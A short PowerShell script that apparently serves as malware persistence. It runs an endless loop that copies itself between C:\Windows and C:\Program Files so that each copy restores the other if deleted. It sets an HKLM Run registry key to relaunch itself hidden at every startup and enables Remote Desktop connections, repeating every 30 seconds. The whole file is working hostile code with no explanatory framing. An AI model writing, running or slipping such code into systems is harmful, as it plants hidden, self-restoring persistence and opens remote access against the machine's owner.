while($true) {
    if(-not (Test-Path -Path "C:\Windows\per.ps1")) {
        Get-Content -Path "C:\Program Files\per.ps1" | Out-File "C:\Windows\per.ps1"
        . "C:\Windows\per.ps1"
    }
    if(-not (Test-Path -Path "C:\Program Files\per.ps1")) {
        Get-Content -Path "C:\Windows\per.ps1" | Out-File "C:\Program Files\per.ps1"
        . "C:\Program Files\per.ps1"
    }
    Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'per' -Value "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -command 'C:\Windows\per.ps1'"
    Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'per' -Value "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -command 'C:\Program Files\per.ps1'"
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 # RDP enable
    Start-Sleep -Seconds 30
}
